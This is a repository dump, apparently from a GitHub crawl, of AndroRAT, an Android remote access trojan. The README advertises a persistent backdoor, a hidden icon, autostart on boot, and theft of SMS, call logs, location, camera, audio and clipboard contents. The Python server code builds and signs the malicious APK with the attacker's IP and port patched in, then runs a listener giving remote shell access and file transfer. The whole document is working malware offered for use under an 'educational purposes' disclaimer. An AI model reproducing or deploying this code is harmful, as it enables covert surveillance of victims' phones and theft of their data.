{
  "metadata": {
    "timestamp": 1736609119274,
    "page": 396,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "karma9874/AndroRAT",
      "stars": 3345,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 0.0966796875,
          "content": "*.smali linguist-detectable=false\n*.java linguist-detectable=true\n*.python linguist-detectable=true"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0380859375,
          "content": "/__pycache__\n/Dumps\n/karma.apk\n/test.py"
        },
        {
          "name": "Android_Code",
          "type": "tree",
          "content": null
        },
        {
          "name": "Compiled_apk",
          "type": "tree",
          "content": null
        },
        {
          "name": "Jar_utils",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.029296875,
          "content": "Copyright (c) 2014 Niraj Singh\n\nPermission is hereby granted, free of charge, to any person\nobtaining a copy of this software and associated documentation\nfiles (the \"Software\"), to deal in the Software without\nrestriction, including without limitation the rights to use,\ncopy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the\nSoftware is furnished to do so, subject to the following\nconditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\nOF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\nHOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\nWHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\nFROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\nOTHER DEALINGS IN THE SOFTWARE."
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 6.44140625,
          "content": "**Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.\n# AndroRAT \n\n[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) \n[![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)\n[![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)\n\nAndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.\n\n##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)\n\n> AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. \n\n## Screenshots\n\n![AndroRAT](Screenshots/5.jpg \"AndroRAT in action\")\n## Features of AndroRAT \n* Full persistent backdoor\n* ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~\n* Invisible icon on install\n* Light weight apk which runs 24*7 in background\n* App starts automatically on boot up \n* Can record audio, video, take picture from both camera\n* Browse call logs and SMS logs\n* Get current location, sim card details ,ip, mac address of the device\n\n\n## Prerequisites\nAndroRAT requires Python3 and JAVA (or Android Studio)\n\n## Installation\n```\ngit clone https://github.com/karma9874/AndroRAT.git\ncd AndroRAT\npip install -r requirements.txt\n```\n#### Note: \nWhile cloning the repository using Git bash on Windows, you may get the following error:\n> error: unable to create file \\<filename>: Filename too long\n\nThis is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename. \n\nYou can circumvent this by setting `core.longpaths` to `true`.\n\n> git config --system core.longpaths true\n\nYou must run Git bash with administrator privileges. \n\n## Usage (Windows and Linux)\n\n* To get the control panel of the app dial `*#*#1337#*#*` (For now it has only two options `Restart Activity` and `Uninstall`)\n> Note: In order to use this feature in some devices you need to enable the option `display pop-up windows running in background` from the settings.\n\n### Available Modes\n* `--build` - for building the android apk \n* `--ngrok` - for using ngrok tunnel (over the internet)\n* `--shell` - getting an interactive shell of the device\n\n### `build` mode\n\n```\nUsage:\n  python3 androRAT.py --build --ngrok [flags]\n  Flags:\n    -p, --port              Attacker port number (optional by default its set to 8000)\n    -o, --output            Name for the apk file (optional by default its set to \"karma.apk\")\n    -icon, --icon           Visible icon after installing apk (by default set to hidden)\n```\n\n```\nUsage:\n  python3 androRAT.py --build [flags]\n  Flags:\n    -i, --ip                Attacker IP address (required)\n    -p, --port              Attacker port number (required)\n    -o, --output            Name for the apk file (optional)\n    -icon, --icon           Visible icon after installing apk (by default set to hidden)\n```\n\nOr you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`\n### `shell` mode\n```\nUsage:\n  python3 androRAT.py --shell [flags]\n  Flags:\n    -i, --ip                Listner IP address\n    -p, --port              Listner port number\n```\nAfter running the `shell` mode you will get an interpreter of the device  \n\nCommands which can run on the interpreter\n```\n    deviceInfo                 --> returns basic info of the device\n    camList                    --> returns cameraID  \n    takepic [cameraID]         --> Takes picture from camera\n    startVideo [cameraID]      --> starts recording the video\n    stopVideo                  --> stop recording the video and return the video file\n    startAudio                 --> starts recording the audio\n    stopAudio                  --> stop recording the audio\n    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file \n    getCallLogs                --> returns call logs in a file\n    shell                      --> starts a sh shell of the device\n    vibrate [number_of_times]  --> vibrate the device number of time\n    getLocation                --> return the current location of the device\n    getIP                      --> returns the ip of the device\n    getSimDetails              --> returns the details of all sim of the device\n    clear                      --> clears the screen\n    getClipData                --> return the current saved text from the clipboard\n    getMACAddress              --> returns the mac address of the device\n    exit                       --> exit the interpreter\n```\nIn the sh shell there are some sub commands\n```\n    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)\n    put [filename]              --> uploads the file to the android device\n```\n\n## Examples\n\n* To build the apk using ngrok which will also set the listner:\n```python3 androRAT.py --build --ngrok -o evil.apk```\n\n* To build the apk using desired ip and port:\n```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```\n\n* To get the interpreter:\n```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```\n\n## Interpreter Examples\n* Generating APK\n<p align=\"center\">\n  <img src=\"Screenshots/6.JPG\" width=\"800\"/>\n</p>\n------------------------------------------------------------------------------------------------------------------------------  \n\n* Some interpreter Commands \n<p align=\"center\">\n  <img src=\"Screenshots/1.JPG\" width=\"800\"/>\n</p>\n------------------------------------------------------------------------------------------------------------------------------\n\n## Supporters:\n[![rayep](https://avatars.githubusercontent.com/u/40718616?v=4&s=60)](https://github.com/rayep)\n\n## TODO\n* ~~Ngrok support~~\n* Set up multi client\n* Add screenshot command\n\n\n## License\nAndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.\n\n\n"
        },
        {
          "name": "Screenshots",
          "type": "tree",
          "content": null
        },
        {
          "name": "androRAT.py",
          "type": "blob",
          "size": 2.4267578125,
          "content": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nfrom utils import *\nimport argparse\nimport sys\nimport platform\ntry:\n    from pyngrok import ngrok,conf\nexcept ImportError as e:\n    print(stdOutput(\"error\")+\"\\033[1mpyngrok not found\");\n    print(stdOutput(\"info\")+\"\\033[1mRun pip3 install -r requirements.txt\")\n    exit()\n    \nclearDirec()\n\n#                     _           _____         _______\n#     /\\             | |         |  __ \\     /\\|__   __|\n#    /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |   \n#   / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |   \n#  / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |   \n# /_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|   \n#                                        - By karma9874\n\n\nparser = argparse.ArgumentParser(usage=\"%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]\")\nparser.add_argument('--build',help='For Building the apk',action='store_true')\nparser.add_argument('--shell',help='For getting the Interpreter',action='store_true')\nparser.add_argument('--ngrok',help='For using ngrok',action='store_true')\nparser.add_argument('-i','--ip',metavar=\"<IP>\" ,type=str,help='Enter the IP')\nparser.add_argument('-p','--port',metavar=\"<Port>\", type=str,help='Enter the Port')\nparser.add_argument('-o','--output',metavar=\"<Apk Name>\", type=str,help='Enter the apk Name')\nparser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')\nargs = parser.parse_args()\n\n\n\nif float(platform.python_version()[:3]) < 3.6 and float(platform.python_version()[:3]) > 3.8 :\n    print(stdOutput(\"error\")+\"\\033[1mPython version should be between 3.6 to 3.8\")\n    sys.exit()\n\nif args.build:\n    port_ = args.port\n    icon=True if args.icon else None\n    if args.ngrok:\n        conf.get_default().monitor_thread = False\n        port = 8000 if not port_ else port_\n        tcp_tunnel = ngrok.connect(port, \"tcp\")\n        ngrok_process = ngrok.get_ngrok_process()\n        domain,port = tcp_tunnel.public_url[6:].split(\":\")\n        ip = socket.gethostbyname(domain)\n        print(stdOutput(\"info\")+\"\\033[1mTunnel_IP: %s PORT: %s\"%(ip,port))\n        build(ip,port,args.output,True,port_,icon)\n    else:\n        if args.ip and args.port:\n            build(args.ip,port_,args.output,False,None,icon)\n        else:\n            print(stdOutput(\"error\")+\"\\033[1mArguments Missing\")\n\nif args.shell:\n    if args.ip and args.port:\n        get_shell(args.ip,args.port) \n    else:\n        print(stdOutput(\"error\")+\"\\033[1mArguments Missing\")"
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.0068359375,
          "content": "pyngrok"
        },
        {
          "name": "utils.py",
          "type": "blob",
          "size": 13.9541015625,
          "content": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport sys\nimport os\nimport base64\nimport time\nimport binascii\nimport select\nimport pathlib\nimport platform\nimport re\nfrom subprocess import PIPE, run\nimport socket\nimport threading\nimport itertools\nimport queue\n\nsys.stdout.reconfigure(encoding='utf-8')\n\nbanner = \"\"\"\\033[1m\\033[91m\n                    _           _____         _______\n    /\\             | |         |  __ \\     /\\|__   __|\n   /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |   \n  / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |   \n / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |   \n/_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|\n\n                                       \\033[93m- By karma9874\n\"\"\"\n\npattern = '\\\"(\\\\d+\\\\.\\\\d+).*\\\"'\n\ndef stdOutput(type_=None):\n    if type_==\"error\":col=\"31m\";str=\"ERROR\"\n    if type_==\"warning\":col=\"33m\";str=\"WARNING\"\n    if type_==\"success\":col=\"32m\";str=\"SUCCESS\"\n    if type_ == \"info\":return \"\\033[1m[\\033[33m\\033[0m\\033[1m\\033[33mINFO\\033[0m\\033[1m] \"\n    message = \"\\033[1m[\\033[31m\\033[0m\\033[1m\\033[\"+col+str+\"\\033[0m\\033[1m]\\033[0m \"\n    return message\n\n\ndef animate(message):\n    chars = \"/—\\\\|\"\n    for char in chars:\n        sys.stdout.write(\"\\r\"+stdOutput(\"info\")+\"\\033[1m\"+message+\"\\033[31m\"+char+\"\\033[0m\")\n        time.sleep(.1)\n        sys.stdout.flush()\n\ndef clearDirec():\n    if(platform.system() == 'Windows'):\n        clear = lambda: os.system('cls')\n        direc = \"\\\\\"\n    else:\n        clear = lambda: os.system('clear')\n        direc = \"/\"\n    return clear,direc\n\nclear,direc = clearDirec()\nif not os.path.isdir(os.getcwd()+direc+\"Dumps\"):\n    os.makedirs(\"Dumps\")\n\ndef is_valid_ip(ip):\n    m = re.match(r\"^(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})$\", ip)\n    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))\n\ndef is_valid_port(port):\n    i = 1 if port.isdigit() and len(port)>1  else  0\n    return i\n\ndef execute(command):\n    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)\n\ndef executeCMD(command,queue):\n    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)\n    queue.put(result)\n    return result\n\n\ndef getpwd(name):\n\treturn os.getcwd()+direc+name;\n\ndef help():\n    helper=\"\"\"\n    Usage:\n    deviceInfo                 --> returns basic info of the device\n    camList                    --> returns cameraID  \n    takepic [cameraID]         --> Takes picture from camera\n    startVideo [cameraID]      --> starts recording the video\n    stopVideo                  --> stop recording the video and return the video file\n    startAudio                 --> starts recording the audio\n    stopAudio                  --> stop recording the audio\n    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file \n    getCallLogs                --> returns call logs in a file\n    shell                      --> starts a interactive shell of the device\n    vibrate [number_of_times]  --> vibrate the device number of time\n    getLocation                --> return the current location of the device\n    getIP                      --> returns the ip of the device\n    getSimDetails              --> returns the details of all sim of the device\n    clear                      --> clears the screen\n    getClipData                --> return the current saved text from the clipboard\n    getMACAddress              --> returns the mac address of the device\n    exit                       --> exit the interpreter\n    \"\"\"\n    print(helper)\n\ndef getImage(client):\n    print(stdOutput(\"info\")+\"\\033[0mTaking Image\")\n    timestr = time.strftime(\"%Y%m%d-%H%M%S\")\n    flag=0\n    filename =\"Dumps\"+direc+\"Image_\"+timestr+'.jpg'\n    imageBuffer=recvall(client) \n    imageBuffer = imageBuffer.strip().replace(\"END123\",\"\").strip()\n    if imageBuffer==\"\":\n        print(stdOutput(\"error\")+\"Unable to connect to the Camera\\n\")\n        return\n    with open(filename,'wb') as img:    \n        try:\n            imgdata = base64.b64decode(imageBuffer)\n            img.write(imgdata)\n            print(stdOutput(\"success\")+\"Succesfully Saved in \\033[1m\\033[32m\"+getpwd(filename)+\"\\n\")\n        except binascii.Error as e:\n            flag=1\n            print(stdOutput(\"error\")+\"Not able to decode the Image\\n\")\n    if flag == 1:\n        os.remove(filename)\n\ndef readSMS(client,data):\n    print(stdOutput(\"info\")+\"\\033[0mGetting \"+data+\" SMS\")\n    msg = \"start\"\n    timestr = time.strftime(\"%Y%m%d-%H%M%S\")\n    filename = \"Dumps\"+direc+data+\"_\"+timestr+'.txt'\n    flag =0\n    with open(filename, 'w',errors=\"ignore\", encoding=\"utf-8\") as txt:\n        msg = recvall(client)\n        try:\n            txt.write(msg)\n            print(stdOutput(\"success\")+\"Succesfully Saved in \\033[1m\\033[32m\"+getpwd(filename)+\"\\n\")\n        except UnicodeDecodeError:\n            flag = 1\n            print(stdOutput(\"error\")+\"Unable to decode the SMS\\n\")\n    if flag == 1:\n    \tos.remove(filename)\n\ndef getFile(filename,ext,data):\n    fileData = \"Dumps\"+direc+filename+\".\"+ext\n    flag=0\n    with open(fileData, 'wb') as file:\n        try:\n            rawFile = base64.b64decode(data)\n            file.write(rawFile)\n            print(stdOutput(\"success\")+\"Succesfully Downloaded in \\033[1m\\033[32m\"+getpwd(fileData)+\"\\n\")\n        except binascii.Error:\n            flag=1\n            print(stdOutput(\"error\")+\"Not able to decode the Audio File\")\n    if flag == 1:\n        os.remove(filename)\n\ndef putFile(filename):\n    data = open(filename, \"rb\").read()\n    encoded = base64.b64encode(data)\n    return encoded\n\ndef shell(client):\n    msg = \"start\"\n    command = \"ad\"\n    while True:\n        msg = recvallShell(client)\n        if \"getFile\" in msg:\n            msg=\" \"\n            msg1 = recvall(client)\n            msg1 = msg1.replace(\"\\nEND123\\n\",\"\")\n            filedata = msg1.split(\"|_|\")\n            getFile(filedata[0],filedata[1],filedata[2])\n            \n        if \"putFile\" in msg:\n            msg=\" \"\n            sendingData=\"\"\n            filename = command.split(\" \")[1].strip()\n            file = pathlib.Path(filename)\n            if file.exists():\n                encoded_data = putFile(filename).decode(\"UTF-8\")\n                filedata = filename.split(\".\")\n                sendingData+=\"putFile\"+\"<\"+filedata[0]+\"<\"+filedata[1]+\"<\"+encoded_data+\"END123\\n\"\n                client.send(sendingData.encode(\"UTF-8\"))\n                print(stdOutput(\"success\")+f\"Succesfully Uploaded the file \\033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/\")\n            else:\n                print(stdOutput(\"error\")+\"File not exist\")\n\n        if \"Exiting\" in msg:\n            print(\"\\033[1m\\033[33m----------Exiting Shell----------\\n\")\n            return\n        msg = msg.split(\"\\n\")\n        for i in msg[:-2]:\n            print(i)   \n        print(\" \")\n        command = input(\"\\033[1m\\033[36mandroid@shell:~$\\033[0m \\033[1m\")\n        command = command+\"\\n\"\n        if command.strip() == \"clear\":\n            client.send(\"test\\n\".encode(\"UTF-8\"))\n            clear()\n        else:\n            client.send(command.encode(\"UTF-8\"))        \n\ndef getLocation(sock):\n    msg = \"start\"\n    while True:\n        msg = recvall(sock)\n        msg = msg.split(\"\\n\")\n        for i in msg[:-2]:\n            print(i)   \n        if(\"END123\" in msg):\n            return\n        print(\" \")     \n\ndef recvall(sock):\n    buff=\"\"\n    data = \"\"\n    while \"END123\" not in data:\n        data = sock.recv(4096).decode(\"UTF-8\",\"ignore\")\n        buff+=data\n    return buff\n\n\ndef recvallShell(sock):\n    buff=\"\"\n    data = \"\"\n    ready = select.select([sock], [], [], 3)\n    while \"END123\" not in data:\n        if ready[0]:\n            data = sock.recv(4096).decode(\"UTF-8\",\"ignore\")\n            buff+=data\n        else:\n            buff=\"bogus\"\n            return buff\n    return buff\n\ndef stopAudio(client):\n    print(stdOutput(\"info\")+\"\\033[0mDownloading Audio\")\n    timestr = time.strftime(\"%Y%m%d-%H%M%S\")\n    data= \"\"\n    flag =0\n    data=recvall(client) \n    data = data.strip().replace(\"END123\",\"\").strip()\n    filename = \"Dumps\"+direc+\"Audio_\"+timestr+\".mp3\"\n    with open(filename, 'wb') as audio:\n        try:\n            audioData = base64.b64decode(data)\n            audio.write(audioData)\n            print(stdOutput(\"success\")+\"Succesfully Saved in \\033[1m\\033[32m\"+getpwd(filename))\n        except binascii.Error:\n            flag=1\n            print(stdOutput(\"error\")+\"Not able to decode the Audio File\")\n    print(\" \")\n    if flag == 1:\n        os.remove(filename)\n\n\ndef stopVideo(client):\n    print(stdOutput(\"info\")+\"\\033[0mDownloading Video\")\n    timestr = time.strftime(\"%Y%m%d-%H%M%S\")\n    data= \"\"\n    flag=0\n    data=recvall(client) \n    data = data.strip().replace(\"END123\",\"\").strip()\n    filename = \"Dumps\"+direc+\"Video_\"+timestr+'.mp4' \n    with open(filename, 'wb') as video:\n        try:\n            videoData = base64.b64decode(data)\n            video.write(videoData)\n            print(stdOutput(\"success\")+\"Succesfully Saved in \\033[1m\\033[32m\"+getpwd(filename))\n        except binascii.Error:\n            flag = 1\n            print(stdOutput(\"error\")+\"Not able to decode the Video File\\n\")\n    if flag == 1:\n        os.remove(\"Video_\"+timestr+'.mp4')\n\ndef callLogs(client):\n    print(stdOutput(\"info\")+\"\\033[0mGetting Call Logs\")\n    msg = \"start\"\n    timestr = time.strftime(\"%Y%m%d-%H%M%S\")\n    msg = recvall(client)\n    filename = \"Dumps\"+direc+\"Call_Logs_\"+timestr+'.txt'\n    if \"No call logs\" in msg:\n    \tmsg.split(\"\\n\")\n    \tprint(msg.replace(\"END123\",\"\").strip())\n    \tprint(\" \")\n    else:\n    \twith open(filename, 'w',errors=\"ignore\", encoding=\"utf-8\") as txt:\n    \t\ttxt.write(msg)\n    \t\ttxt.close()\n    \t\tprint(stdOutput(\"success\")+\"Succesfully Saved in \\033[1m\\033[32m\"+getpwd(filename)+\"\\033[0m\")\n    \t\tif not os.path.getsize(filename):\n    \t\t\tos.remove(filename)\n\ndef get_shell(ip,port):\n    soc = socket.socket() \n    soc = socket.socket(type=socket.SOCK_STREAM)\n    try:\n        # Restart the TCP server on exit\n        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        soc.bind((ip, int(port)))\n    except Exception as e:\n        print(stdOutput(\"error\")+\"\\033[1m %s\"%e);exit()\n\n    soc.listen(2)\n    print(banner)\n    while True:\n        que = queue.Queue()\n        t = threading.Thread(target=connection_checker,args=[soc,que])\n        t.daemon = True\n        t.start()\n        while t.is_alive(): animate(\"Waiting for Connections  \")\n        t.join()\n        conn, addr = que.get()\n        clear()\n        print(\"\\033[1m\\033[33mGot connection from \\033[31m\"+\"\".join(str(addr))+\"\\033[0m\")\n        print(\" \")\n        while True:\n            msg = conn.recv(4024).decode(\"UTF-8\")\n            if(msg.strip() == \"IMAGE\"):\n                getImage(conn)\n            elif(\"readSMS\" in msg.strip()):\n                content = msg.strip().split(\" \")\n                data = content[1]\n                readSMS(conn,data)\n            elif(msg.strip() == \"SHELL\"):\n                shell(conn)\n            elif(msg.strip() == \"getLocation\"):\n                getLocation(conn)\n            elif(msg.strip() == \"stopVideo123\"):\n                stopVideo(conn)\n            elif(msg.strip() == \"stopAudio\"):\n                stopAudio(conn)\n            elif(msg.strip() == \"callLogs\"):\n                callLogs(conn)\n            elif(msg.strip() == \"help\"):\n                help()\n            else:\n                print(stdOutput(\"error\")+msg) if \"Unknown Command\" in msg else print(\"\\033[1m\"+msg) if \"Hello there\" in msg else print(msg)\n            message_to_send = input(\"\\033[1m\\033[36mInterpreter:/> \\033[0m\")+\"\\n\"\n            conn.send(message_to_send.encode(\"UTF-8\"))\n            if message_to_send.strip() == \"exit\":\n                print(\" \")\n                print(\"\\033[1m\\033[32m\\t (∗ ･‿･)ﾉ゛\\033[0m\")\n                sys.exit()\n            if(message_to_send.strip() == \"clear\"):clear()\n\n\ndef connection_checker(socket,queue):\n    conn, addr = socket.accept()\n    queue.put([conn,addr])\n    return conn,addr\n\n\ndef build(ip,port,output,ngrok=False,ng=None,icon=None):\n    editor = \"Compiled_apk\"+direc+\"smali\"+direc+\"com\"+direc+\"example\"+direc+\"reverseshell2\"+direc+\"config.smali\"\n    try:\n        file = open(editor,\"r\").readlines()\n        #Very much uncertaninity but cant think any other way to do it xD\n        file[18]=file[18][:21]+\"\\\"\"+ip+\"\\\"\"+\"\\n\"\n        file[23]=file[23][:21]+\"\\\"\"+port+\"\\\"\"+\"\\n\"\n        file[28]=file[28][:15]+\" 0x0\"+\"\\n\" if icon else file[28][:15]+\" 0x1\"+\"\\n\"\n        str_file=\"\".join([str(elem) for elem in file])\n        open(editor,\"w\").write(str_file)\n    except Exception as e:\n        print(e)\n        sys.exit()\n    java_version = execute(\"java -version\")\n    if java_version.returncode: print(stdOutput(\"error\")+\"Java not installed or found\");exit()\n    #version_no = re.search(pattern, java_version.stderr).groups()[0]\n    # if float(version_no) > 1.8: print(stdOutput(\"error\")+\"Java 8 is required, Java version found \"+version_no);exit()\n    print(stdOutput(\"info\")+\"\\033[0mGenerating APK\")\n    outFileName = output if output else \"karma.apk\"\n    que = queue.Queue()\n    t = threading.Thread(target=executeCMD,args=[\"java -jar Jar_utils/apktool.jar b Compiled_apk  -o \"+outFileName,que],)\n    t.start()\n    while t.is_alive(): animate(\"Building APK \")\n    t.join()\n    print(\" \")\n    resOut = que.get()\n    if not resOut.returncode:\n        print(stdOutput(\"success\")+\"Successfully apk built in \\033[1m\\033[32m\"+getpwd(outFileName)+\"\\033[0m\")\n        print(stdOutput(\"info\")+\"\\033[0mSigning the apk\")\n        t = threading.Thread(target=executeCMD,args=[\"java -jar Jar_utils/sign.jar -a \"+outFileName+\" --overwrite\",que],)\n        t.start()\n        while t.is_alive(): animate(\"Signing Apk \")\n        t.join()\n        print(\" \")\n        resOut = que.get()\n        if not resOut.returncode:\n            print(stdOutput(\"success\")+\"Successfully signed the apk \\033[1m\\033[32m\"+outFileName+\"\\033[0m\")\n            if ngrok:\n                clear()\n                get_shell(\"0.0.0.0\",8000) if not ng else get_shell(\"0.0.0.0\",ng)\n            print(\" \")\n        else:\n            print(\"\\r\"+resOut.stderr)\n            print(stdOutput(\"error\")+\"Signing Failed\")\n    else:\n        print(\"\\r\"+resOut.stderr)\n        print(stdOutput(\"error\")+\"Building Failed\")\n"
        }
      ]
    }
  ]
}